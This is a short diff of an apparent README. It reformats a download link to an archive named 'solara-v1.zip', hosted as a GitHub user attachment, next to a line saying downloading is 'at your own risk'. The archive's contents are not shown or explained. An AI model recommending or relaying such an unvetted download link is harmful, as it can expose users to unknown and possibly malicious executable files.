@@ -17,4 +17,4 @@ So if you already downloaded, all action is at your own risk
 
 ## The solara
 
-``` [solara-v1.zip](https://github.com/user-attachments/files/26447211/solara-v1.zip) ```
+> [solara-v1.zip](https://github.com/user-attachments/files/26447211/solara-v1.zip) 
